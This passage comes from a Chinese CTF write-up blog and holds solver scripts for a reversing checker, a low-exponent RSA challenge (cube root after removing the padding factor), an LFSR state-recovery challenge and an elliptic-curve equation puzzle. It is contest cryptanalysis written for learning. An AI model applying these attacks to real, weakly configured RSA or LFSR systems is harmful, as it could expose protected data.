class="string">&quot; wrong&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	std::cout&lt;&lt;x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">checker4</span>();</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	if(checker4_check(0b000010,4))&#123;</span></span><br><span class="line"><span class="comment">		std::cout&lt;&lt;&quot;correct&quot;;</span></span><br><span class="line"><span class="comment">	&#125;else&#123;</span></span><br><span class="line"><span class="comment">		std::cout&lt;&lt;&quot;wrong&quot;;</span></span><br><span class="line"><span class="comment">	&#125;*/</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>做完发现其实可以F5直接看反汇编 用C语言的逻辑运算来判断更简单</p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby RSA"></a>Baby RSA</h3><p>明文转换后长度很短 可以直接低指数加密攻击 开方<br>这里末尾补0相当于乘2的n次方 底数还是单项式 可以左右同乘逆来使得左边恢复到较小的明文 然后开方</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,getPrime</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">baby_rsa</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    flag b&#x27;ab&#x27;</span></span><br><span class="line"><span class="string">    pad  b&#x27;ab\x00\x00&#x27;</span></span><br><span class="line"><span class="string">    hex  b&#x27;61 62 00 00&#x27;</span></span><br><span class="line"><span class="string">    int 0x6162 * 2**16</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    x = pad*8</span></span><br><span class="line"><span class="string">    (m*2**x)**e mod n = c</span></span><br><span class="line"><span class="string">    m**e * 2**xe mod n = c</span></span><br><span class="line"><span class="string">    m**e mod n = c * (2**ex)-1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    N=<span class="number">16530365897488441262718469160468305284672770158565384656092954623166151666302358404933519039638206427781958395014977873069315249917687177391054598956921816589982653878314268070746187225652226338489804977785763153836685700798637491040895954952095422949071944941698464075339538328682378899518357259255186771307748930179001187349761726049249957165990922342916419869650553300100675697071325624717861450136979864203856665171732760034460573404619831815041691417998362001038634540263831565785650815875836418726271391989975051958347165191015489214380435520924596097210274112756495171085840647510675017795358896351877011292749</span></span><br><span class="line">    c=<span class="number">1649242716162425826952050775303626268696750298411662319537259424228876945404220528279665292763881515080700349538084002211268837126748044168226799293579149622927076423346431814176280309043104500742869900600491670771220025075170550107937095925147470540522377810395335659166311121764537896320094910974901416858921029589127145477064557304982115657845643933262558300020611395670651783198790515650255634160032636409647553580657649111930945938237122361584298948645275748211120347592403311681019560483613600396814929463355821651618347651685517027239330376660444812896525930403439089808046524555500501484453485168927363278214</span></span><br><span class="line">    e=<span class="number">3</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    def pad(m):</span></span><br><span class="line"><span class="string">        return m + b&#x27;\x00&#x27; * (255 - len(m))</span></span><br><span class="line"><span class="string">    flag = b&#x27;0ops&#123;123&#125;&#x27;</span></span><br><span class="line"><span class="string">    p = 111345042336617079395655969248384725462942989722982708986115750759582884327143846096591193086377487304656518041676837325011033537087510526817704471697404176187078871161470888545207754020019021746157064253305053303512621476201052191949956657153110512813676935622000049248802125683401544972238560398010672992601</span></span><br><span class="line"><span class="string">    q = 153271507501132502258967640136039635283134834243664743747270391389487283488801676850443858493501493587201641571605287451116678489374548421733711540807596096746696511663395091514758222006766300592141141966606374343902616443452703301934074963209880423996150731879969146868471922084764152939831612389213674285053</span></span><br><span class="line"><span class="string">    print(p,q)</span></span><br><span class="line"><span class="string">    n = p * q</span></span><br><span class="line"><span class="string">    N = n</span></span><br><span class="line"><span class="string">    m=int(flag.hex(), 16)</span></span><br><span class="line"><span class="string">    print(int(flag.hex(), 16)*2**((255-len(flag))*8))</span></span><br><span class="line"><span class="string">    print(int(pad(flag).hex(), 16))</span></span><br><span class="line"><span class="string">    ct = pow(int(pad(flag).hex(), 16), e, n)</span></span><br><span class="line"><span class="string">    c = ct</span></span><br><span class="line"><span class="string">    print(&#x27;c:&#x27;,c)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> flag_length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">40</span>):</span><br><span class="line">        <span class="comment">#if flag_length!=len(flag):</span></span><br><span class="line">            <span class="comment">#continue</span></span><br><span class="line">        <span class="built_in">print</span>(flag_length)</span><br><span class="line">        pad = <span class="number">255</span>-flag_length</span><br><span class="line">        t = e*pad*<span class="number">8</span></span><br><span class="line">        <span class="comment">#print(2**t)</span></span><br><span class="line">        inv = gmpy2.invert(<span class="number">2</span>**t,N)</span><br><span class="line">        <span class="comment">#print(inv*2**t%N)</span></span><br><span class="line">        m3 = c*inv%N</span><br><span class="line">        m,flag = gmpy2.iroot(gmpy2.mpz(m3),e)</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">              <span class="built_in">print</span>(long_to_bytes(m.digits()))</span><br><span class="line">              <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="RSFL"><a href="#RSFL" class="headerlink" title="RSFL"></a>RSFL</h3><p>数据每次向左移一位 右边补一位为：</p>
<ul>
<li>若二进制表示中1个数为奇数 补1</li>
<li>若二进制表示中1个数为偶数 补0</li>
</ul>
<p>左边移出的信息通过右边补的体现了 lsb通过tmp给出 可以复原<br>第一种</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#from secret import flag</span></span><br><span class="line">flag = <span class="string">b&quot;0ops&#123;flagtestflagtestflagtestaa&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">mask = <span class="number">0x9e393e7126c18da37dc14f9a3113c50c8ad4a522ae4501b20531</span></span><br><span class="line"><span class="comment">#mask =  0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">limit = <span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">ri = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LFSR</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">	output = (<span class="built_in">input</span> &lt;&lt; <span class="number">1</span>) &amp; limit</span><br><span class="line">	i = (<span class="built_in">input</span> &amp; mask) &amp; limit</span><br><span class="line">	a = <span class="built_in">list</span>(<span class="built_in">bin</span>(i))<span class="comment">#二进制表示1的位数是奇数</span></span><br><span class="line">	b = a.count(<span class="string">&#x27;1&#x27;</span>) % <span class="number">2</span></span><br><span class="line">	lsb = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">		lsb ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">		i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">	<span class="keyword">assert</span> lsb == b</span><br><span class="line">	<span class="comment">#print(bin(output)[:10])</span></span><br><span class="line">	output ^= lsb</span><br><span class="line">	<span class="comment">#print(lsb,end=&#x27;&#x27;)</span></span><br><span class="line">	<span class="comment">#print(bin(output)[:10])</span></span><br><span class="line">	<span class="keyword">return</span> (output, lsb)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">32</span></span><br><span class="line">R = <span class="built_in">int</span>.from_bytes(flag[<span class="number">5</span>: -<span class="number">1</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;R:&#x27;</span>,R)</span><br><span class="line"><span class="comment">#print(int.to_bytes(R,28,&#x27;big&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;R:&#x27;</span>,<span class="built_in">bin</span>(R))</span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">208</span>):</span><br><span class="line">    (R, lsb) = LFSR(R)</span><br><span class="line">    tmp = (tmp &lt;&lt; <span class="number">1</span>) | lsb</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    if i in [204,205,206]:</span></span><br><span class="line"><span class="string">        print(i,bin(R),len(bin(R))-2)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(R)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"><span class="comment">#R=tmp</span></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#lsb只改变填充的最后一位 不改变原先的bit</span></span><br><span class="line"><span class="comment">#已知tmp是lsb 可以从第一位就开始恢复 恢复207位 然后恢复真实数据</span></span><br><span class="line">tmp = <span class="number">0xc9fe198703d93a7cff319d81c311b169de4b8d528d2dbec4859b</span></span><br><span class="line">r = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">207</span>):</span><br><span class="line">    r &lt;&lt;= <span class="number">1</span></span><br><span class="line">    lsb = (tmp &gt;&gt; (<span class="number">207</span>-i))&amp;<span class="number">1</span></span><br><span class="line">    <span class="comment">#print(lsb,end=&#x27;&#x27;)</span></span><br><span class="line">    r ^= lsb</span><br><span class="line"><span class="comment"># 这里得到的r是R207的最后207位</span></span><br><span class="line"><span class="comment"># tmp &amp; 1为R207&amp;mask 二进制中1个数的奇偶</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = r</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">207</span>):</span><br><span class="line">    n |= ((<span class="built_in">list</span>(<span class="built_in">bin</span>(n &amp; mask)).count(<span class="string">&#x27;1&#x27;</span>)%<span class="number">2</span>) ^ ((tmp&gt;&gt;i) &amp; <span class="number">1</span>)) &lt;&lt; <span class="number">207</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(bin(n))</span></span><br><span class="line"></span><br><span class="line">    n &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m1 = <span class="built_in">int</span>.to_bytes(n,<span class="number">28</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line">m2 = <span class="built_in">int</span>.to_bytes(n + (<span class="number">1</span>&lt;&lt;<span class="number">207</span>),<span class="number">28</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(m2)</span><br><span class="line"><span class="comment">#reverse_an_LFSR_is_so_easy</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第二种</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#from secret import flag</span></span><br><span class="line">flag = <span class="string">b&quot;0ops&#123;flagtestflagtestflagtestaa&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">mask = <span class="number">0x9e393e7126c18da37dc14f9a3113c50c8ad4a522ae4501b20531</span></span><br><span class="line"><span class="comment">#mask =  0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">limit = <span class="number">0xffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">ri = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LFSR</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">        output = (<span class="built_in">input</span> &lt;&lt; <span class="number">1</span>) &amp; limit</span><br><span class="line">        i = (<span class="built_in">input</span> &amp; mask) &amp; limit</span><br><span class="line">        a = <span class="built_in">list</span>(<span class="built_in">bin</span>(i))<span class="comment">#二进制表示1的位数是奇数</span></span><br><span class="line">        b = a.count(<span class="string">&#x27;1&#x27;</span>) % <span class="number">2</span></span><br><span class="line">        lsb = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">                lsb ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">                i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">assert</span> lsb == b</span><br><span class="line">        <span class="comment">#print(bin(output)[:10])</span></span><br><span class="line">        output ^= lsb</span><br><span class="line">        <span class="comment">#print(lsb,end=&#x27;&#x27;)</span></span><br><span class="line">        <span class="comment">#print(bin(output)[:10])</span></span><br><span class="line">        <span class="keyword">return</span> (output, lsb)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">32</span></span><br><span class="line">R = <span class="built_in">int</span>.from_bytes(flag[<span class="number">5</span>: -<span class="number">1</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;R:&#x27;</span>,R)</span><br><span class="line"><span class="comment">#print(int.to_bytes(R,28,&#x27;big&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;R:&#x27;</span>,<span class="built_in">bin</span>(R))</span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>*<span class="number">208</span>):</span><br><span class="line">    (R, lsb) = LFSR(R)</span><br><span class="line">    tmp = ((tmp &lt;&lt; <span class="number">1</span>) | lsb) &amp; limit</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    if i &gt;= 2*208-6:</span></span><br><span class="line"><span class="string">        print(len(bin(tmp)),bin(tmp)[:8],bin(tmp)[-4:],list(bin(tmp &amp; mask)).count(&#x27;1&#x27;))</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(R)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="built_in">bin</span>(tmp)),<span class="built_in">bin</span>(tmp)[:<span class="number">8</span>])</span><br><span class="line"><span class="comment">#R=tmp</span></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line">tmp = <span class="number">0x8919055a184e6842a5136da171fed5e0dc979ef724acf19317d0</span></span><br><span class="line"><span class="comment">#tmp = 0xc9fe198703d93a7cff319d81c311b169de4b8d528d2dbec4859b</span></span><br><span class="line">valid_list = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789[]+=-~!@#$%^&amp;()`\\&quot;</span></span><br><span class="line">valid_list = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> valid_list]</span><br><span class="line">N = <span class="number">26</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> i:i <span class="keyword">in</span> valid_list,s))) &gt;= N</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">208</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">100000</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    odd = tmp &amp; <span class="number">1</span></span><br><span class="line">    tmp = tmp &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">list</span>(<span class="built_in">bin</span>(tmp &amp; mask)).count(<span class="string">&#x27;1&#x27;</span>)%<span class="number">2</span> == odd:</span><br><span class="line">        <span class="comment">#print(0)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp |= <span class="number">1</span> &lt;&lt; <span class="number">207</span></span><br><span class="line">        <span class="comment">#print(1)</span></span><br><span class="line">    <span class="keyword">if</span> tmp ==<span class="number">0x8919055a184e6842a5136da171fed5e0dc979ef724acf19317d0</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    m1 = <span class="built_in">int</span>.to_bytes(tmp,<span class="number">28</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> check(m1):</span><br><span class="line">        <span class="built_in">print</span>(m1)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="built_in">str</span>(m1))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    m2 = <span class="built_in">int</span>.to_bytes(tmp + (<span class="number">1</span>&lt;&lt;<span class="number">207</span>),<span class="number">28</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> check(m2):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="built_in">str</span>(m2))</span><br><span class="line">        <span class="built_in">print</span>(m2)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个本来是给rsfl+做的  不过没做出来</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Baby-Equation"><a href="#Baby-Equation" class="headerlink" title="Baby Equation"></a>Baby Equation</h3><p>检索一下 可以发现这篇文章的思路说的很清楚<br><a target="_blank" rel="noopener" href="https://www.agftutoring.com/x-yz-y-xz-z-xy-4/">https://www.agftutoring.com/x-yz-y-xz-z-xy-4/</a></p>
<p>从文章中提到的论文找到准确的公式<br><a target="_blank" rel="noopener" href="http://publikacio.uni-eszterhazy.hu/2858/1/AMI_43_from29to41.pdf">http://publikacio.uni-eszterhazy.hu/2858/1/AMI_43_from29to41.pdf</a><br>然后自己手写一下脚本 根据公式算结果 加入4096bit的约束</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line">N = <span class="number">14</span></span><br><span class="line"></span><br><span class="line">a = Fraction(<span class="number">4</span>*N**<span class="number">2</span>+<span class="number">12</span>*N-<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">b = Fraction(<span class="number">32</span>*(N+<span class="number">3</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">aa = b-Fraction(<span class="number">1</span>,<span class="number">3</span>)*a**<span class="number">2</span></span><br><span class="line">bb = Fraction(<span class="number">2</span>,<span class="number">27</span>)*a**<span class="number">3</span>-a*b/<span class="number">3</span></span><br><span class="line"><span class="comment">#print(aa,bb)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">equ</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    <span class="keyword">return</span> a/(b+c)+b/(a+c)+c/(a+b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lcm_3</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    lcm_ab = (a*b)//gmpy2.gcd(a,b)</span><br><span class="line">    <span class="comment">#return a*b*c</span></span><br><span class="line">    <span class="keyword">return</span> lcm_ab*c // gmpy2.gcd(lcm_ab,c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geta</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">8</span>*(N+<span class="number">3</span>)-x+y)/(<span class="number">2</span>*(<span class="number">4</span>-x)*(N+<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getb</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">8</span>*(N+<span class="number">3</span>)-x-y)/(<span class="number">2</span>*(<span class="number">4</span>-x)*(N+<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getc</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> ((-<span class="number">4</span>)*(N+<span class="number">3</span>)-(N+<span class="number">2</span>)*x)/((<span class="number">4</span>-x)*(N+<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    <span class="keyword">assert</span> equ(a,b,c)== N</span><br><span class="line">    <span class="keyword">if</span> a &gt; <span class="number">0</span> <span class="keyword">and</span> b &gt; <span class="number">0</span> <span class="keyword">and</span> c &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment">#print(a,b,c)</span></span><br><span class="line">        da,db,dc = a.denominator,b.denominator,c.denominator</span><br><span class="line">        lcm = lcm_3(da,db,dc)</span><br><span class="line">        <span class="comment">#print(lcm)</span></span><br><span class="line">        lcm = Fraction(<span class="built_in">int</span>(lcm),<span class="number">1</span>)</span><br><span class="line">        aa,bb,cc = a.numerator*lcm//a.denominator,b.numerator*lcm//b.denominator,c.numerator*lcm//c.denominator</span><br><span class="line">        <span class="keyword">if</span> log(aa,<span class="number">10</span>) &gt;<span class="number">4096</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;a=<span class="subst">&#123;aa&#125;</span>\nb=<span class="subst">&#123;bb&#125;</span>\nc=<span class="subst">&#123;cc&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(equ(aa,bb,cc))</span><br><span class="line">        <span 